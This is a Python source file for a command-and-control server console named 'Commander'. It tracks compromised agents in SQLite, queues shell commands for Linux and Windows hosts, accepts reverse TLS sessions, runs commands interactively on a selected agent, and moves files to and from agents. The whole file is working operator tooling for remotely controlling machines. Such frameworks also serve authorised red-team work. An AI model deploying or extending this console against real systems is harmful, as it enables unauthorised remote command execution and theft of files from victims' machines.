import cmd
import sqlite3
import pyfiglet
import os
import socket
import threading
from time import sleep
from threading import Lock
from _thread import *
import struct
import ssl
import tqdm


def recreate_tasks_table(conn, cursor):
    cursor.execute(f'''
    DROP TABLE IF EXISTS tasks;
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS tasks (
        uuid text NOT NULL,
        task text NOT NULL,
        FOREIGN KEY (uuid) REFERENCES hosts (uuid)
    );
    ''')
    conn.commit()


def delete_tables(conn, cursor):
    cursor.execute('''
    DROP TABLE IF EXISTS hosts;
    ''')
    cursor.execute('''
    DROP TABLE IF EXISTS tasks;
    ''')
    cursor.execute('''
    DROP TABLE IF EXISTS results;
    ''')
    conn.commit()


def init_db(conn,cursor):
    # Create tables if they don't already exist
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS hosts (
        uuid text PRIMARY KEY,
        type text,
        ip text NOT NULL
    );
    ''')
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS tasks (
        uuid text NOT NULL,
        task text NOT NULL,
        FOREIGN KEY (uuid) REFERENCES hosts (uuid)
    );
    ''')
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS results (
        uuid text NOT NULL,
        result text NOT NULL,
        FOREIGN KEY (uuid) REFERENCES hosts (uuid)
    );
    ''')
    conn.commit()


def connect_db():
    return sqlite3.connect('c2.db', timeout=10)


# https://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data

def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

# possible actions for database lock issue
# https://gist.github.com/rianhunter/10bfcff17c18d112de16
# https://stackoverflow.com/questions/2740806/python-sqlite-database-is-locked


class CLI(cmd.Cmd):
    intro = f"""{pyfiglet.figlet_format("Commander")}\n\nType help or ? to list commands.\n\n\n"""
    #intro = 'Welcome to the C2 CLI Interface. Type help or ? to list commands.\n'
    prompt = 'c2_cli> '
    conn = None
    cursor = None

    def __init__(self, conn, cursor):
        super().__init__()
        self.conn = conn
        self.cursor = cursor
        self.host = 'localhost'
        self.port = 5555
        self.ServerSocket = None
        self.connections = []
        self.addresses = []
        self._exit_sessions_lock = Lock()
        self.exit_session = False
        self.server_start_flag = False
        self.current_shell_conn = None        
        self.current_shell_idx = -1
        self.ssl_socket_context = None
        self.file_separator = "<SEPARATOR>"
        self.buffer_size = 1024 #* 4

    def emptyline(self):
        pass       
    
    def default(self,line):
        if self.prompt == 'c2_cli> ':
            print('Unknown command. Use ? to see the availiable commands')
        else:
            if "go back" in line:
                self.prompt = 'c2_cli> '
                self.current_shell_conn = None
                self.current_shell_idx = -1

            elif "local-ls" in line:
                try:
                    arg_length = len(line.split())

                    if arg_length > 2 or (arg_length == 2 and line.split()[1].startswith("-")):
                        raise ValueError("Invalid argument")
                    elif arg_length == 2:
                        dir_path = line.split()[1]
                    else:
                        dir_path = os.getcwd()

                    dir_list = os.listdir(dir_path)
                    
                    for dir_item in dir_list:
                        print(dir_item)
                except Exception as ex:
                    print(f"Error: {ex}")

            else:
                try:
                    if self.current_shell_conn:

                        if line.split()[0] == 'download':
                            self.current_shell_conn.settimeout(3600.0)
                            # Send the file name to the agent
                            filename_cmd = f"c2-sessions download {line.split()[1]}"
                            send_msg(self.current_shell_conn, filename_cmd.encode())                            

                            # Receive the file size from the agent
                            received = recv_msg(self.current_shell_conn).decode()                            
                            filesize = int(received.split(self.file_separator)[0])                            

                            # print(f"filesize: {filesize}")

                            if filesize != -1:                                                                
                                try:

                                    filename = os.path.basename(line.split()[1])

                                    with open(filename, 'wb') as f:
                                        with tqdm.tqdm(total=filesize, unit='B', unit_scale=True) as pbar:
                                            bytes_received = 0
                                            while bytes_received < filesize:
                                                chunk = self.current_shell_conn.recv(1024)
                                                f.write(chunk)
                                                bytes_received += len(chunk)
                                                pbar.update(len(chunk))
                                    print(f"[+] File {line.split()[1]} received successfully")
                                except Exception as ex:
                                    print(f'[-] Error on download: {ex}')                                    
                                    raise
                                
                            else:
                                print("[-] Error! File doesn't exist?..")

                        elif line.split()[0] == 'upload':
                            self.current_shell_conn.settimeout(3600.0)
                            # Send the file name to the agent

                            filename = ""

                            try:
                                filename = line.split()[1]
                            except Exception as ex:
                                print('No file provided')
                                return

                            if not os.path.exists(filename):
                                print(f"File {filename} doesn't exist")                                
                                return  
                            
                            file_size = os.path.getsize(filename)

                            filename_cmd = f"c2-sessions upload {filename} {file_size}"
                            
                            try:                                
                                with open(filename, 'rb') as f:
                                    send_msg(self.current_shell_conn, filename_cmd.encode())
                                    go_or_not = recv_msg(self.current_shell_conn).decode()
                                    # print(f'go_or_not: {go_or_not}')
                                    if go_or_not.split(self.file_separator)[0] != "GO!":
                                        print(f"Result: {go_or_not}")
                                        return
                                    with tqdm.tqdm(total=file_size, unit='B', unit_scale=True) as pbar:                                        
                                        bytes_sent = 0
                                        while bytes_sent < file_size:
                                            chunk = f.read(1024)
                                            self.current_shell_conn.sendall(chunk)
                                            bytes_sent += len(chunk)
                                            pbar.update(len(chunk))
                                    # print(f"[+] File {filename} uploaded successfully")
                            except Exception as ex:
                                print(f"[-] Error on upload : {ex}")                                
                            
                            response_res = recv_msg(self.current_shell_conn).decode()
                            print(f"Result: {response_res}")
                            
                        else:
                            send_msg(self.current_shell_conn,str.encode(f'c2-sessions cmd {line}'))                        
                            self.current_shell_conn.settimeout(60.0)
                            rsp = recv_msg(self.current_shell_conn)                        
                            print(rsp.decode('utf-8', errors='ignore'))
                    else:
                        print("Not valid connection")
                except Exception as ex:
                    print(f"timeout... response took too long. {ex}")
                    import traceback
                    traceback.print_exc()
                    self.prompt = 'c2_cli> '
                    # self.current_shell_conn
                    self.close_session(self.current_shell_idx)
                    self.current_shell_conn = None
                    self.current_shell_idx = -1
                    return

    def list_connections(self):        
        if not self.server_start_flag:
            print(f"\nSessions server is not running...\n")
            return
        try:
            deactivated_agents = set()
            res = '-------------------------------- Sessions --------------------------------\n'
            # print(f'self.connections len : {len(self.connections)}')
            for i, conn in enumerate(self.connections):
                # print(f'i : {i}')
                try:                    
                    send_msg(conn,str.encode(f'c2-sessions ping'))                    
                    conn.settimeout(5.0)
                    pong = recv_msg(conn)                   
                    
                    if not pong:
                        # del self.connections[i]
                        # del self.addresses[i]
                        deactivated_agents.add(i)                                                
                        continue

                except Exception as ex:
                    # print(f'exception: {ex}')
                    # print(f'except i : {i}')
                    # print(f'self.connections len : {len(self.connections)}')
                    # print(f'self.addresses len : {len(self.addresses)}')

                    # del self.connections[i]
                    # del self.addresses[i]
                    
                    deactivated_agents.add(i)
                    continue                

            # comment the following code if you don't want to delete and clear the connections and addresses lists

            tmp_conn_lst = []
            tmp_addr_lst = []

            for i, conn in enumerate(self.connections):
                if i not in deactivated_agents:
                    tmp_conn_lst.append(self.connections[i])
                    tmp_addr_lst.append(self.addresses[i])

            self.connections = tmp_conn_lst
            self.addresses = tmp_addr_lst

            for i, conn in enumerate(self.connections):
                # use this line if you don't use the clear lists                
                #if i not in deactivated_agents:
                res += f'[{i}] {self.addresses[i][0]} {self.addresses[i][1]} {self.addresses[i][2]}\n'            

            print(f'{res}')
            return

        except Exception as ex:
            print(f"Error on list_connections: {ex}")    
            # import traceback
            # traceback.print_exc()
            self.close_session_handler() 

    def socket_create(self):
        try:
            self.ServerSocket = socket.socket()

        except Exception as ex:
            print(f"Error on socket_create: {ex} . Try again!")            
            

        self.ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        
        return

    def socket_bind(self):        
        try:
            self.ServerSocket.bind(('', self.port))
            self.ServerSocket.listen(10)

            self.ssl_socket_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

            self.ssl_socket_context.load_cert_chain('server.crt', 'server.key')

        except Exception as ex:
            print(f"Error on socket_bind: {ex}")            
            sleep(3)
            # self.socket_bind()
        return


    def socket_accept(self):        

        for cn in self.connections:
            cn.close()

        self.connections = []
        self.addresses = []

        while True:
            try:                
                client_socket, address = self.ServerSocket.accept()

                conn = self.ssl_socket_context.wrap_socket(client_socket, server_side=True)  

                # maybe a non-blocking conn is an equal good option
                           
                # this resets the timer so set it before the timeout                
                conn.setblocking(True)

                # set a guard timer in case a pong isn't received
                conn.settimeout(5.0)

                client_rsp = recv_msg(conn).decode("utf-8")                                
                address = address + (client_rsp,)

                with self._exit_sessions_lock:                    
                    if self.exit_session:
                        print('\nSession Handler is shutting down...\nDO NOT FORGET TO "task delete uuid" if you don\'t want the agents to keep retrying...\n\nPress Enter...\n')
                        self.close_sessions_and_quit_handler()     
                        break
            except Exception as ex:
                print(f"Error on accept_connections: {ex}")                  
                continue

            self.connections.append(conn)
            self.addresses.append(address)
            
            print(f'\nConnection received from: {address[-1]} {address[0]} \nPress Enter...\n')
            
        return

    def close_session(self, conn_idx):                
        if conn_idx == -1:
            print('Some error occured on connections')
            return
        try:
            conn_to_close = self.connections[conn_idx]

            if self.current_shell_conn == conn_to_close:                
                self.current_shell_conn = None
                self.current_shell_idx = -1

            send_msg(conn_to_close,str.encode(f'c2-sessions quit'))
            conn_to_close.shutdown(2)
            conn_to_close.close()
            
            del self.connections[conn_idx]
            del self.addresses[conn_idx]

        except Exception as ex:
            print(f"Error on close_sessions_and_quit: {ex}")    

    def close_sessions_and_quit_handler(self):        
        for conn in self.connections:
            try:
                send_msg(conn,str.encode(f'c2-sessions quit'))
                conn.shutdown(2)
                conn.close()

            except Exception as ex:
                pass# print(f"Error on close_sessions_and_quit: {ex} - Maybe the agents have already closed their connection")                 
        self.ServerSocket.close()

    def close_session_handler(self, quit = False):
        if self.server_start_flag:
            with self._exit_sessions_lock:
                self.exit_session = True   
                try:         
                    # sends a message to itself to close the connections
                    local_socket = socket.socket()
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(local_socket, server_hostname=self.host)
                    s.connect((self.host, self.port))
                    send_msg(s,str.encode(f'local_msg'))                
                    s.close()
                except Exception as ex:
                    print(f"Error in local_msg: {ex}")
            self.server_start_flag = False
        else:
            if not quit:
                print(f"\nSessions server is not running...\n")

    def print_rows(self, three_args = False, num = False, number = 0):
        for i, row in enumerate(self.cursor.fetchall()):
            if num:
                if three_args:
                    print(f'[{number+1}] {row[0]} {row[1]} {row[2]}')
                else:
                    print(f'[{number+1}] {row[0]} {row[1]}')
            else:
                if three_args:
                    print(f'[{i+1}] {row[0]} {row[1]} {row[2]}')
                else:
                    print(f'[{i+1}] {row[0]} {row[1]}')


    def add_agent(self, uuid_str, type, ip):
            self.cursor.execute("INSERT INTO hosts (uuid, type, ip) VALUES (?,?,?)", (uuid_str, type, ip))
            self.conn.commit()

    def add_result(self, agent_name, result):
            self.cursor.execute("INSERT OR REPLACE INTO results (uuid, result) VALUES (?,?)", (agent_name, result))
            self.conn.commit()

    def add_task(self, uuid_str, task):
        self.cursor.execute('SELECT uuid FROM tasks WHERE uuid=?', (uuid_str,))    
        #uuids = cursor.fetchone()
        # using fetchall() seems to resolve the rare error "What a Terrible Failure in register: database is locked"    
        uuids = [r[0] for r in self.cursor.fetchall()]
        #print(f'res: {uuids}')
        if uuids:
            print(f"\033[91mYou can't add another task for {uuid_str} , it has a pending one...\033[0m")
        else:
            print(f"\033[92mTask added for {uuid_str}\033[0m")
            self.cursor.execute('INSERT INTO tasks (uuid, task) VALUES (?, ?)', (uuid_str, task))
            #print("OK!")

    def del_task(self, uuid_str):
        self.cursor.execute('DELETE FROM tasks WHERE uuid=?', (uuid_str,))
    
    
    def do_task(self, args):
        args = args.split()
        if len(args) == 0:
            self.do_help("task")
        elif args[0] == "add":            
            if len(args) < 3:
                self.do_help("task")
                return

            uuid_str = args[1]
            task = ' '.join(args[2:])

            if uuid_str == "all":
                #print("task add all case")
                self.cursor.execute('SELECT uuid FROM hosts')
                uuids = [r[0] for r in self.cursor.fetchall()]
                for u in uuids:
                    self.add_task(u, task)
                    
                self.conn.commit()
                #print("OK!")
                
            elif "type" in uuid_str:
                uuid_str = uuid_str.split('=')
                if uuid_str[1] in ["Linux", "Windows"]:                    
                    self.cursor.execute('SELECT uuid FROM hosts WHERE type=?',(uuid_str[1],))
                    uuids = [r[0] for r in self.cursor.fetchall()]
                    for u in uuids:
                        self.add_task(u, task)
                    self.conn.commit()
                    #print("OK!")
                else:
                    self.do_help("task")                
            else:
                # specific uuid
                self.add_task(uuid_str, task)
                self.conn.commit()   
                #print("OK!")
            
        elif args[0] == "delete":
            if len(args) > 1:
                uuid_str = args[1]
                if uuid_str == 'all':
                    recreate_tasks_table(self.conn, self.cursor)
                    #print("OK!")

                elif "type" in uuid_str:
                    uuid_str = uuid_str.split('=')
                    if uuid_str[1] in ["Linux", "Windows"]:                        
                        self.cursor.execute('SELECT uuid FROM hosts WHERE type=?',(uuid_str[1],))
                        uuids = [r[0] for r in self.cursor.fetchall()]
                        for u in uuids:
                            self.del_task(u)
                        self.conn.commit()
                        #print("OK!")
                    else:
                        self.do_help("task")   
                    
                else:
                    self.del_task(uuid_str)                    

                self.conn.commit()
                print("OK!")
            else:
                self.do_help("task delete")
        else:
            self.do_help("task")
            
    def do_show(self, args):
        args = args.split()
        if len(args) < 2:
            self.do_help("show")
        elif args[0] == "agent":
            uuid_str = args[1]
            if uuid_str == 'all':
                self.cursor.execute('SELECT * FROM hosts')
                self.print_rows(True)
                # for i, row in enumerate(self.cursor.fetchall()):
                # #for row in self.cursor.fetchall():
                #     print(f'[{i+1}]{row[0]}, {row[1]}, {row[2]}')

            elif "type" in uuid_str:
                uuid_str = uuid_str.split('=')
                if uuid_str[1] in ["Linux", "Windows"]:                        
                    self.cursor.execute('SELECT * FROM hosts WHERE type=?',(uuid_str[1],))
                    self.print_rows(True)
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}, {row[2]}')

            else:
                self.cursor.execute('SELECT * FROM hosts WHERE uuid=?',(uuid_str,))
                self.print_rows(True)
                # for i, row in enumerate(self.cursor.fetchall()):
                #     print(f'[{i+1}]{row[0]}, {row[1]}, {row[2]}')

        elif args[0] == "task":
            if len(args) > 1:
                uuid_str = args[1]
                if uuid_str == 'all':
                    self.cursor.execute('SELECT * FROM tasks')
                    self.print_rows()
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}')

                elif "type" in uuid_str:
                    uuid_str = uuid_str.split('=')
                    if uuid_str[1] in ["Linux", "Windows"]:                        
                        self.cursor.execute('SELECT * FROM hosts WHERE type=?',(uuid_str[1],))
                        uuids = [r[0] for r in self.cursor.fetchall()]
                        for i, u in enumerate(uuids):
                            self.cursor.execute('SELECT * FROM tasks WHERE uuid=?',(u,))
                            self.print_rows(False, num = True, number = i)
                            # for i, row in enumerate(self.cursor.fetchall()):
                            #     print(f'[{i+1}]{row[0]}, {row[1]}')
                            
                    else:
                        self.do_help("task") 

                else:
                    self.cursor.execute('SELECT * FROM tasks WHERE uuid=?',(uuid_str,))
                    self.print_rows()
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}')
            else:
                self.do_help("show task")
        elif args[0] == "result":
            if len(args) > 1:
                uuid_str = args[1]
                if uuid_str == 'all':
                    self.cursor.execute('SELECT * FROM results')                    
                    self.print_rows()
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}')

                elif "type" in uuid_str:
                    uuid_str = uuid_str.split('=')
                    if uuid_str[1] in ["Linux", "Windows"]:                        
                        self.cursor.execute('SELECT * FROM hosts WHERE type=?',(uuid_str[1],))
                        uuids = [r[0] for r in self.cursor.fetchall()]
                        for u in uuids:
                            self.cursor.execute('SELECT * FROM results WHERE uuid=?',(u,))
                            self.print_rows()
                            # for i, row in enumerate(self.cursor.fetchall()):
                            #     print(f'[{i+1}]{row[0]}, {row[1]}')

                elif uuid_str:
                    self.cursor.execute('SELECT * FROM results WHERE uuid=?',(uuid_str,))
                    self.print_rows()
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}')
            else:
                self.do_help("show result")
        else:
            self.do_help("show")
            
    def do_find(self, args):
        args = args.split()
        if len(args) == 2 and args[0] == "active" and args[1] == "agents":
            val = input("This will delete your database. Do you want to continue? (y/N):")            
            if val == "n" or val == "N" or val == "":
                print('Aborting..')
                return False                
            delete_tables(self.conn, self.cursor)
            init_db(self.conn, self.cursor)
            print('Deleted')
        else:
            self.do_help("find")

    def do_sessions(self, args):
        args = args.split()
        if len(args) >= 2 and args[0] == "server":
            if args[1] == "start":

                if self.server_start_flag:
                    print(f"\nServer is already running on port: {self.port}\n")
                    return

                try:
                    port_to_use = int(args[2])
                    self.port = port_to_use
                    print(f'\nSessions Server started at port: {self.port}\n')
                except:                    
                    self.port = 5555
                    print(f'\nNot a valid integer for port... Continuing with the default port: {self.port} \n')

                self.server_start_flag = True

                with self._exit_sessions_lock:
                    self.exit_session = False

                self.socket_create()
                self.socket_bind()
                t = threading.Thread(target=self.socket_accept,)
                t.start()
                #start_new_thread(self.accept_connections())
            elif args[1] == "stop":            
                self.close_session_handler()
            
            elif args[1] == "status":
                if self.server_start_flag:
                    print(f"\nSessions server is running on port: {self.port}\n")
                else:
                    print(f"\nSessions server is not running...\n")

        elif len(args) == 2 and args[0] == "select":
            try:
                host_idx = int(args[1])
            except:
                print('Use an integer from the sessions list')
                return             
            
            try:
                host_conn = self.connections[host_idx]   
                self.current_shell_conn = host_conn
                self.current_shell_idx = host_idx
            except:
                print('Connection not found. Use sessions list')
                return       

            print("Use 'go back' command to leave the session without closing it and return to Commander CLI\n")

            self.prompt = f'{self.addresses[host_idx][2]}> '

        elif len(args) == 2 and args[0] == "close":
            try:
                host_idx = int(args[1])
            except:
                print('Use an integer from the sessions list')
                return             
            
            try:                
                #host_conn = self.connections[host_idx]
                self.close_session(host_idx)                   
                
            except:
                print('Connection not found. Use sessions list')
                return       

            print("Connection closed\n")
            print("DO NOT FORGET TO 'task delete uuid' if you don't want to keep connecting\n")

            self.prompt = 'c2_cli> '

        elif len(args) == 1:
            if args[0] == "list":
                self.list_connections()            

        else:
            self.do_help("sessions")
            
    def do_exit(self, args):       
        if self.prompt != 'c2_cli> ':
            print("If you want to exit the admin console use 'go back' first and then 'exit'")
        else:            
            self.close_session_handler(True)
            print("Bye Bye Operator!")
            return True
    
    def complete_task(self, text, line, begidx, endidx):
        
        options = ["add", "delete"]
        options_add = ["your_uuid", "all", "type="]
        options_del = ["your_uuid", "all", "type="]
        options_c2 = ["c2-"]        
        options_c2_cmds = ["register", "shell", "sleep", "quit", "session"]
        options_os = ["linux", "windows"]

        if "task add" in line:
            if "task add" in line and (begidx==14):
                return [i for i in options_os if i.startswith(text)]
            elif "task add" in line and (begidx==45 or begidx==16 or begidx==23 or begidx==25):
                return [i for i in options_c2_cmds if i.startswith(text)]
            elif "task add" in line and (begidx==42 or begidx==13 or begidx==20 or begidx==22): 
                return [i for i in options_c2 if i.startswith(text)]
            elif "task add" in line: 
                return [i for i in options_add if i.startswith(text)]        
        elif "task delete" in line:            
            if "task delete" in line and (begidx==17):
                return [i for i in options_os if i.startswith(text)]
            elif "task delete" in line: 
                return [i for i in options_del if i.startswith(text)]   
        else:
            return [i for i in options if i.startswith(text)]        
        
    def complete_show(self, text, line, begidx, endidx):
        
        options = ["agent", "task", "result"]
        options_args = ["your_uuid", "all", "type="]
        options_os = ["Linux", "Windows"]

        if "show task" in line:
            if "show task" in line and (begidx==15):
                return [i for i in options_os if i.startswith(text)]
            elif "show task" in line: 
                return [i for i in options_args if i.startswith(text)]
        
        elif "show result" in line:
            if "show result" in line and (begidx==12):
                return [i for i in options_args if i.startswith(text)]
            elif "show result" in line and (begidx==17):
                return [i for i in options_os if i.startswith(text)]

        elif "show agent" in line:
            if "show agent" in line and (begidx==11):
                return [i for i in options_args if i.startswith(text)]
            elif "show agent" in line and (begidx==16):
                return [i for i in options_os if i.startswith(text)]
        else:
            return [i for i in options if i.startswith(text)]


    def complete_sessions(self, text, line, begidx, endidx):
        
        options = ["server", "select", "list", "close"] 
        options_server_args = ["start", "stop", "status"]        

        if "sessions server" in line:
            return [i for i in options_server_args if i.startswith(text)]
        
        else:
            return [i for i in options if i.startswith(text)]
            
        
    def complete_find(self, text, line, begidx, endidx):
        options = ["active agents"]
        if text:
            return [i for i in options if i.startswith(text)]
        else:
            return options

    # help menu
    def do_help(self, args):               
            
        print("Commands:\n\n"
              "  task add arg c2-commands\n"
              "    Add a task to an agent, to a group or on all agents.\n"
              "    arg: can have the following values: 'all' 'type=Linux|Windows' 'your_uuid' \n"
              "    c2-commands: possible values are c2-register c2-shell c2-sleep c2-quit\n"
              "      c2-register: Triggers the agent to register again.\n"
              "      c2-shell cmd: It takes an shell command for the agent to execute. eg. c2-shell whoami\n"
              "         cmd: The command to execute.\n"
              "      c2-sleep: Configure the interval that an agent will check for tasks.\n"
              "      c2-session port: Instructs the agent to open a shell session with the server to this port.\n"
              "         port: The port to connect to. If it is not provided it defaults to 5555.\n"
              "      c2-quit: Forces an agent to quit.\n\n"
              "  task delete arg\n"
              "    Delete a task from an agent or all agents.\n"
              "    arg: can have the following values: 'all' 'type=Linux|Windows' 'your_uuid' \n"
              "  show agent arg\n"
              "    Displays info for all the availiable agents or for specific agent.\n"              
              "    arg: can have the following values: 'all' 'type=Linux|Windows' 'your_uuid' \n"
              "  show task arg\n"
              "    Displays the task of an agent or all agents.\n"
              "    arg: can have the following values: 'all' 'type=Linux|Windows' 'your_uuid' \n"
              "  show result arg\n"
              "    Displays the history/result of an agent or all agents.\n"
              "    arg: can have the following values: 'all' 'type=Linux|Windows' 'your_uuid' \n"
              "  find active agents\n"
              "    Drops the database so that the active agents will be registered again.\n\n"              
              "  exit\n"
              "    Bye Bye!\n\n"              
              )
        
        if args in ["sessions",""]:
            print("Sessions:\n\n"         
              "  sessions server arg [port]\n"
              "    Controls a session handler.\n"              
              "    arg: can have the following values: 'start' , 'stop' 'status' \n"
              "    port: port is optional for the start arg and if it is not provided it defaults to 5555. This argument defines the port of the sessions server\n"
              "  sessions select arg\n"
              "    Select in which session to attach.\n"
              "    arg: the index from the 'sessions list' result \n"
              "  sessions close arg\n"
              "    Close a session.\n"
              "    arg: the index from the 'sessions list' result \n"
              "  sessions list\n"
              "    Displays the availiable sessions\n"               
              "  local-ls directory\n"
              "    Lists on your host the files on the selected directory \n"               
              "  download 'file'\n"
              "    Downloads the 'file' locally on the current directory \n"               
              "  upload 'file'\n"
              "    Uploads a file in the directory where the agent currently is \n"               
              )

if __name__ == '__main__':
    #conn = None

    try:
    
        # move db init in CLI class
        conn = sqlite3.connect('c2.db', timeout=10)
        cursor = conn.cursor()

        init_db(conn,cursor)

        mycli = CLI(conn,cursor)
        os.system('clear')
        mycli.cmdloop()

    except Exception as ex:
            print(f'Exception in main: {ex}')
    finally:
        if conn:
                 conn.close()